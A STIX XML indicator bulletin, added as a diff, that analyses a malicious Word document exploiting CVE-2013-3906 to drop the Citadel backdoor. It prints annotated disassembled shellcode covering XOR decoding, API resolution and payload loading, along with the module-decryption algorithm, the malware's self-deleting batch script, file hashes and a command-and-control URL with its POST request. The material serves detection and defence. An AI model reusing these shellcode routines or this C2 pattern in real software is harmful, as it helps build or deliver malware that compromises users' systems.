@@ -1,0 +1,545 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:CISCP="http://www.us-cert.gov/ciscp" id="CISCP:IB-13-10806" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Malicious Word Document Exploits CVE-2013-3906</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 19 November 2013, a file was received for analysis. The file is a Word document that exploits CVE-2013-3906. When this file successfully exploits the vulnerability, the compromised system performs HTTP POST requests for one domain.
+
+This Indicator Bulletin incorporates data originally released as MIFR-325397.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-12-04T21:25:54Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-8db00742-335c-4786-9da2-47d789878408" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-bb506b90-be9a-4cc4-8867-121a81d92b12"/>
+        <indicator:Indicator idref="CISCP:indicator-7615178c-e447-4d40-9d65-736c696cd0d7"/>
+        <indicator:Indicator idref="CISCP:indicator-0fdd144d-0634-4140-ad67-de4dd0e598ff"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-bb506b90-be9a-4cc4-8867-121a81d92b12" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This Word document contains an OLE2 object named "active.bin", which contains obfuscated shellcode.
+
+The shellcode is encrypted by the simple xoring of each byte with 0xEE. Shown below is the stub that decoded the shellcode:
+
+seg000:0000085F				sub_85F proc near
+seg000:0000085F 5B 					pop ebx
+seg000:00000860 4B					dec ebx
+seg000:00000861 33 C9 					xor ecx, ecx
+seg000:00000863 66 81 C9 7E 02 					or cx, 27Eh
+seg000:00000868
+seg000:00000868 				loc_868:
+seg000:00000868 80 34 0B EE				xor byte ptr [ebx+ecx], 0EEh
+seg000:0000086C E2 FA 				loop loc_868
+seg000:0000086E EB 05				jmp short near ptr unk_875
+seg000:0000086E sub_85F 				endp ; sp-analysis failed
+
+This function decodes 638 (0x27E) bytes, and then jumps to the deciphered shellcode.
+
+Below is shown the deciphered shellcode:
+00420875 E9 2C 02 00 00	 			jmp 00420AA6
+0042087A 5F 				pop edi
+0042087B 64 A1 30 00 00 00 				mov eax,dword ptr fs:[00000030h]	
+	;PEB
+00420881 8B 40 0C 				mov eax,dword ptr [eax+0Ch]
+	;PEB_LDR_DATA
+00420884 8B 70 1C 				mov esi,dword ptr [eax+1Ch]
+	;InOrderModuleList
+00420887 AD 				lods dword ptr [esi]
+00420888 8B 68 08 				mov ebp,dword ptr [eax+8]
+	;first module
+0042088B 8B 70 20 				mov esi,dword ptr [eax+20h]
+0042088E 8B 00 				mov eax,dword ptr [eax]
+	;second module, this module is "kernel32".
+00420890 80 3E 6B 				cmp byte ptr [esi],6Bh
+00420893 75 F3 				jne 00420888
+00420895 46 				inc esi
+00420896 46 				inc esi
+00420897 80 3E 65 				cmp byte ptr [esi],65h
+0042089A 75 EC 				jne 00420888
+0042089C 46 				inc esi
+0042089D 46 				inc esi
+0042089E 80 3E 72 				cmp byte ptr [esi],72h
+004208A1 75 F7 				jne 0042089A
+004208A3 46 				inc esi
+004208A4 46 				inc esi
+004208A5 80 3E 6E 				cmp byte ptr [esi],6Eh
+004208A8 75 F0 				jne 0042089A
+004208AA 8B F7 				mov esi,edi
+004208AC 6A 12 				push 12h
+004208AE 59 				pop ecx
+004208AF E8 AD 01 00 00 				call 00420A61
+	;resolves addresses of the APIs.
+004208B4 E2 F9 				loop 004208AF
+	;number of the function is 0x12.
+
+The shellcode resolves the addresses of the following APIs (all APIs are from "kernel32.dll" library):
+
+GetTempPath
+FreeLibararyAndExitThread
+CreateFile
+CloseHandle
+WriteFile
+GetCurrentProcessId
+CreateToolhelpSnapshot
+Thread32First
+Thread32Next
+SuspendThread
+OpenThread
+GetCurrentThreadId
+LoadLibrary
+FreeLibrary
+SetFilePointer
+GetFileSize
+VirtualAlloc
+ReadFile
+
+The shellcode jumps to this function to resolve API addresses after the value in the EDI register is compared to the "kernel32.dll". Register EBP points to the kernel32 base.
+
+00420A61 51 				push ecx
+00420A62 56 				push esi
+00420A63 8B 75 3C 				mov esi,dword ptr [ebp+3Ch]
+00420A66 8B 74 2E 78 				mov esi,dword ptr [esi+ebp+78h]
+00420A6A 03 F5 				add esi,ebp
+00420A6C 56 				push esi
+00420A6D 8B 76 20 				mov esi,dword ptr [esi+20h]
+00420A70 03 F5 				add esi,ebp
+00420A72 33 C9 				xor ecx,ecx
+00420A74 49 				dec ecx
+00420A75 AD 				lods dword ptr [esi]
+00420A76 41 				inc ecx
+00420A77 33 DB 				xor ebx,ebx
+00420A79 03 C5 				add eax,ebp
+00420A7B 0F BE 10 				movsx edx,byte ptr [eax]
+00420A7E 3A D6 				cmp dl,dh
+00420A80 74 08 				je 00420A8A
+00420A82 C1 CB 0D 				ror ebx,0Dh
+00420A85 03 DA 				add ebx,edx
+00420A87 40 				inc eax
+00420A88 EB F1 				jmp 00420A7B
+00420A8A 3B 1F 				cmp ebx,dword ptr [edi]
+00420A8C 75 E7 				jne 00420A75
+00420A8E 5E 				pop esi
+00420A8F 8B 5E 24 				mov ebx,dword ptr [esi+24h]
+00420A92 03 DD 				add ebx,ebp
+00420A94 66 8B 0C 4B 				mov cx,word ptr [ebx+ecx*2]
+00420A98 8B 5E 1C 				mov ebx,dword ptr [esi+1Ch]
+00420A9B 03 DD 				add ebx,ebp
+00420A9D 8B 04 8B 				mov eax,dword ptr [ebx+ecx*4]
+00420AA0 03 C5 				add eax,ebp
+00420AA2 AB 				stos dword ptr es:[edi]
+00420AA3 5E 				pop esi
+00420AA4 59				pop ecx
+00420AA5 C3 				ret
+
+The shellcode continues execution here after resolving API addresses.
+
+004208B6 FF 56 14 				call dword ptr [esi+14h]
+	;GetCurrentProcessID
+004208B9 8B D8 				mov ebx,eax
+004208BB FF 56 2C 				call dword ptr [esi+2Ch]
+	;GetCurrentThreadId
+004208BE 50 				push eax
+004208BF 83 EC 1C 				sub esp,1Ch
+004208C2 33 C0 				xor eax,eax
+004208C4 50 				push eax
+004208C5 6A 04 				push 4
+	;TH32CS_SNAPTHREAD
+004208C7 FF 56 18 				call dword ptr [esi+18h]
+	;CreateToolhelpSnapshot
+004208CA 83 F8 FF 				cmp eax,0FFFFFFFFh
+004208CD 74 44 				je 00420913
+004208CF 8B FC 				mov edi,esp
+004208D1 C7 07 1C 00 00 00 				mov dword ptr [edi],1Ch
+004208D7 50 				push eax
+004208D8 8B 04 24 				mov eax,dword ptr [esp]
+004208DB 57 				push edi
+004208DC 50 				push eax
+004208DD FF 56 1C 				call dword ptr [esi+1Ch]
+	;Thread32First
+004208E0 85 C0 				test eax,eax
+004208E2 74 2C 				je 00420910
+004208E4 8B 47 0C 				mov eax,dword ptr [edi+0Ch]
+	;th32OwnerProcessID
+004208E7 3B C3 				cmp eax,ebx
+	;owner pid == current pid.
+004208E9 75 19 				jne 00420904
+004208EB 8B 47 08 				mov eax,dword ptr [edi+8]
+	;th32ThreadID
+004208EE 3B 44 24 20 				cmp eax,dword ptr [esp+20h]
+004208F2 74 10 				je 00420904
+004208F4 50 				push eax
+004208F5 33 C0 				xor eax,eax
+004208F7 50				 push eax
+004208F8 68 FF FF 1F 00 				push 1FFFFFh
+004208FD FF 56 28 				call dword ptr [esi+28h]
+	;OpenThread
+00420900 50 				push eax
+00420901 FF 56 24 				call dword ptr [esi+24h]
+00420904 8B 04 24 				mov eax,dword ptr [esp]
+00420907 57 				push edi
+00420908 50 				push eax
+00420909 FF 56 20 				call dword ptr [esi+20h]
+	;Thread32Next
+0042090C 85 C0 				test eax,eax
+0042090E 75 D4 				jne 004208E4
+00420910 FF 56 0C 				call dword ptr [esi+0Ch]
+	;CloseHandle
+00420913 33 DB 				xor ebx,ebx
+00420915 83 C3 04 				add ebx,4
+00420918 81 FB 00 00 10 00 				cmp ebx,100000h
+0042091E 0F 87 85 00 00 00 				ja 004209A9
+00420924 33 C0				 xor eax,eax
+00420926 50 				push eax
+	;method, here it is FILE_BEGIN
+00420927 50 				push eax
+	;distance to move high
+00420928 B0 20 				mov al,20h
+0042092A 50 				push eax
+	;distance to move low.
+0042092B 53 				push ebx
+	;file handle
+0042092C FF 56 38 				call dword ptr [esi+38h]
+	;SetFilePointer
+0042092F 83 F8 FF 				cmp eax,0FFFFFFFFh
+00420932 74 E1 				je 00420915
+00420934 33 C0 				xor eax,eax
+00420936 50 				push eax
+00420937 53 				push ebx
+00420938 FF 56 3C 				call dword ptr [esi+3Ch]
+	;GetFileSize
+0042093B 3D 00 10 00 00 				cmp eax,1000h
+00420940 7C D3 				jl 00420915
+00420942 8B F8 				mov edi,eax
+00420944 83 EC 04 				sub esp,4
+00420947 8B CC 				mov ecx,esp
+00420949 83 EC 04 				sub esp,4
+0042094C 8B D4 				mov edx,esp
+0042094E 33 C0 				xor eax,eax
+00420950 50 				push eax
+00420951 51 				push ecx
+00420952 6A 04 				push 4
+00420954 52 				push edx
+00420955 53 				push ebx
+00420956 FF 56 44 				call dword ptr [esi+44h]
+	; ReadFile
+00420959 85 C0 				test eax,eax
+0042095B 58 				pop eax
+0042095C 59 				pop ecx
+0042095D 74 B6 				je 00420915
+0042095F 3D 63 50 72 6F 		cmp eax,6F725063h
+	; "cPro"
+00420964 75 AF 				jne 00420915
+00420966 83 EF 24 			sub edi,24h
+00420969 6A 04 				push 4
+0042096B 68 00 30 00 00 		push 3000h
+00420970 57 				push edi
+00420971 6A 00 				push 0
+00420973 FF 56 40 			call dword ptr [esi+40h]
+	; VirtaulAlloc
+00420976 83 EC 04 			sub esp,4
+00420979 8B CC 				mov ecx,esp
+0042097B 6A 00 				push 0
+0042097D 51 				push ecx
+0042097E 57 				push edi
+0042097F 50 				push eax
+00420980 8B F8 				mov edi,eax
+00420982 53 				push ebx
+00420983 FF 56 44 			call dword ptr [esi+44h]
+	;ReadFIle
+00420986 85 C0 				test eax,eax
+00420988 5A 				pop edx
+	;allocation size
+00420989 74 1E 				je 004209A9
+0042098B B8 B5 00 9B B1 		mov eax,0B19B00B5h
+00420990 47 				inc edi
+	;start of the allocated buffer
+00420991 4A 				dec edx
+00420992 85 D2 				test edx,edx
+00420994 7E 13 				jle 004209A9
+00420996 39 07 				cmp dword ptr [edi],eax
+00420998 75 F6 				jne 00420990
+0042099A 83 C7 04 			add edi,4
+0042099D 83 EA 04 			sub edx,4
+004209A0 39 07 				cmp dword ptr [edi],eax
+004209A2 75 EC 				jne 00420990
+	;jumped to GetTempPath
+004209A4 83 C7 04 			add edi,4
+004209A7 EB 4A 				jmp 004209F3
+004209A9 66 8C CB 			mov bx,cs
+004209AC 80 FB 23 			cmp bl,23h
+004209AF 75 06 				jne 004209B7
+004209B1 33 D2 				xor edx,edx
+004209B3 52 				push edx
+004209B4 52 				push edx
+004209B5 52 				push edx
+004209B6 52 				push edx
+004209B7 BA FF FF 0F 00 		mov edx,0FFFFFh
+004209BC 66 81 CA FF 0F 		or dx,0FFFh
+004209C1 42 				inc edx
+004209C2 52 				push edx
+004209C3 80 FB 23 			cmp bl,23h
+004209C6 74 19 				je 004209E1
+004209C8 6A 02 				push 2
+004209CA 58 				pop eax
+004209CB CD 2E 				int 2Eh
+004209CD 5A 				pop edx
+004209CE 3C 05 				cmp al,5
+004209D0 74 EA 				je 004209BC
+004209D2 B8 B5 00 9B B1 		mov eax,0B19B00B5h
+	;compare value in the register EAX to the module beginning marker.
+004209D7 8B FA 				mov edi,edx
+004209D9 AF 				scas dword ptr es:[edi]
+004209DA 75 E5 				jne 004209C1
+004209DC AF scas 			dword ptr es:[edi]
+004209DD 75 E2 				jne 004209C1
+004209DF EB 12 				jmp 004209F3
+004209E1 6A 26 				push 26h
+004209E3 58 				pop eax
+004209E4 33 C9 				xor ecx,ecx
+004209E6 8B D4 				mov edx,esp
+004209E8 64 FF 15 C0 00 00 00  		call dword ptr fs:[0C0h]
+004209EF 59 				pop ecx
+004209F0 5A 				pop edx
+004209F1 EB DB 				jmp 004209CE
+004209F3 81 EC FC 00 00 00		sub esp,0FCh
+004209F9 8B DC 				mov ebx,esp
+004209FB 53 				push ebx
+	;path
+004209FC 68 FC 00 00 00			push 0FCh
+	;size
+00420A01 FF 16 				call dword ptr [esi]
+	;GetTempPath
+00420A03 C7 04 03 61 2E 6C 00 		mov dword ptr [ebx+eax],6C2E61h
+	;"l.a"- the filename
+00420A0A 33 C0 				xor eax,eax
+00420A0C 50 				push eax
+00420A0D 6A 02 				push 2
+00420A0F 6A 02 				push 2
+00420A11 50 				push eax
+00420A12 50				push eax
+00420A13 68 00 00 00 40			push 40000000h
+00420A18 53 				push ebx
+00420A19 FF 56 08 			call dword ptr [esi+8]
+	;CreateFile, DLL file is created in the "%TEMP%" directory.
+00420A1C 8B D0 				mov edx,eax
+00420A1E 52 				push edx
+	;file handle
+00420A1F 52 				push edx
+	;file handle
+00420A20 53 				push ebx
+	;path
+00420A21 8A 07 				mov al,byte ptr [edi]
+	;initialize AL register
+00420A23 47 				inc edi
+00420A24 8A 1F 				mov bl,byte ptr [edi]
+	;initialize BL register
+00420A26 47 				inc edi
+00420A27 8B 0F 				mov ecx,dword ptr [edi]
+	;register ECX contains the size of the buffer to be deciphered.
+00420A29 51 				push ecx
+00420A2A 83 C7 04 				add edi,4
+00420A2D 57 				push edi
+00420A2E 8A 17 				mov dl,byte ptr [edi]
+	;deciphering starts here
+00420A30 32 D0 				xor dl,al
+00420A32 88 17 				mov byte ptr [edi],dl
+00420A34 47 				inc edi
+00420A35 02 C3 				add al,bl
+00420A37 49 				dec ecx
+00420A38 85 C9 				test ecx,ecx
+00420A3A 75 F2 				jne 00420A2E
+	;end of the deciphering loop
+
+The module ("activeX1.bin") is deciphered before being loaded into "winword.exe". Below is shown the algorithm used for deciphering this module:
+
+unsigned char c1 = 0x3A ;al = 0x3A - original decrypting key
+unsigned char c2 = 0x9E ;bl = 0x9E - dynamic decryption key
+unsigned int size = 0x7D400 ;ecx = 0x7d400 - size of the data
+unsigned int start = 0x6EE ;[buffer + 0xc]
+unsigned int offset = 0;
+while (counter &lt; size)
+{
+  buffer[offset+start] = buffer[offset+start] ^ c1;
+  offset ++;
+  c1 += c2;
+}
+
+The memory snapshot of the beginning of the encrypted module:
+B5 00 9B B1 B5 00 9B B1 3A 9E 00 D4 07 00 77 82
+E6 14 B1 50 EE 8C 2E C8 66 04 5D BF DE 7C A2 B8
+56 F4 92 30 CE 6C 4A A8 46 E4 82 20 BE 5C FA 98
+36 D4 72 10 AE 4C EA 88 26 C4 62 00 9E 3C DA 78
+16 B4 52 F0 8E 2C CA 68 06 A4 BA E0 7E 1C B4 47
+4C 9A 32 64 67 C1 8B F0 E7 C8 EF E1 0A 94 F3 4B
+F6 04 60 DF 29 9E EB 45 E6 07 63 CE 50 B3 0E 38
+D4 31 D2 E2 5B A2 4A 61 C8 64 A6 CF 4D 9C 37 97
+
+B5 00 9B B1 B5 00 9B B1 - marker, the shellcode uses this value to find the module
+3A - initial xor key
+9E - running xor key
+00 D4 07 00 - data size
+77 82 .... - encrypted data.
+
+The execution continued here, deciphered module is written into the "l.a" file on the disk in the "%TEMP%" directory and loaded into "winword.exe".
+
+00420A3C 5F 				pop edi
+00420A3D 59 				pop ecx
+00420A3E 5B 				pop ebx
+00420A3F 5A 				pop edx
+00420A40 83 EC 04 				sub esp,4
+00420A43 8B C4 				mov eax,esp
+00420A45 6A 00 				push 0
+00420A47 50 				push eax
+00420A48 51 				push ecx
+00420A49 57 				push edi
+00420A4A 52 				push edx
+00420A4B FF 56 10 				call dword ptr [esi+10h]
+	;WriteFile
+00420A4E 58 				pop eax
+00420A4F FF 56 0C 				call dword ptr [esi+0Ch]
+00420A52 53 				push ebx
+00420A53 FF 56 30 				call dword ptr [esi+30h]
+	;LoadLibrary
+00420A56 50 				push eax
+00420A57 FF 56 34 				call dword ptr [esi+34h]
+	;FreeLibrary
+00420A5A 33 C0 				xor eax,eax
+00420A5C 50 				push eax
+00420A5D 50 				push eax
+00420A5E FF 56 04 				call dword ptr [esi+4]
+	;FreeLibraryAndExitThread</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-71c974e3-aa03-4733-822f-0b0bf026bfa3">
+        <cybox:Object id="CISCP:Object-9c167056-2f7e-41e9-a239-b17d3a70a7b8">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Missing_MT103_Confirmation.docx</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">618607</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">3fabaf6d31195cb6107f5af9d8c7b86e</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">adcd33e06b8611909463a6dbb58e91c86c9bb3b5</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">05215a8f65c7c63e47f51e7e2f21531eec47c4ccb633962ff60efbeae579fcfa</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12288:LKk9XVJ/bBzgxfC1zAHgYHTGnxDi0eIaV7u:XTByfWKgYzGhDKu</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-08T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7615178c-e447-4d40-9d65-736c696cd0d7" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This malicious executable file embedded in the resource section of the "l.a" DLL file. This is an instance of the Citadel backdoor.
+
+"A.exe" creates 3 (three) directories in the "%APP_DATA%" directory. All these directories have randomly generated names.
+
+The original malware copies itself into the executable file located in one of those newly created directories.
+
+The malware also creates files that are used to store collected data. Data in these stored files is in an encrypted format.
+
+"Date Created" file attribute for all created/copied files changed to some random dates. The malware also drops a batch script (BAT) file that performs "clean up" by deleting the original "a.exe" file and batch script itself. Contents of this batch script file is as follow:
+
+@echo off
+:d
+del "[Original Malware File location]\a.exe"
+if exist "[Original Malware File location]\a.exe" goto d
+del /F "%Temp%\tmp[Random Alpha-Numerical String].bat"</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-20a853e7-d5ce-4cc5-8f0e-f7562360b044">
+        <cybox:Object id="CISCP:Object-b53eb061-a78d-468c-b8a6-bbbae24f11ab">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">a.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">491184</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">10454f10ed70f06c18e8834c6d581274</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">a4bd40e539515c01a0db9e20cf69fd1b5072ce80</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">7a4309716740b29fd37f8f2cb1eea3b4f82d2c7cee75dbef96cd2b5ef5538152</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12288:qFsQn0pQEzD+hMFH8X2jkuU3dYGBTG5dZl:2sQ0mEdH8X2jkJdBBS5dZl</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-08T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-0fdd144d-0634-4140-ad67-de4dd0e598ff" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>The dropped file (MD5: 10454f10ed70f06c18e8834c6d581274) generates a HTTP POST request to this URL.
+
+----- BEGIN HTTP REQUEST -----
+POST /callzone/meeting/file.php HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E)
+Host: motherboardreasons.net
+Content-Length: 131
+Connection: Keep-Alive
+Cache-Control:
+-----  END HTTP REQUEST  -----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-3e6492ff-755b-4db8-8c24-1d0ff51456a3">
+        <cybox:Object id="CISCP:Object-4cfbc403-810b-487d-a61d-38284092ea34">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://motherboardreasons.net/callzone/meeting/file.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-11-08T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
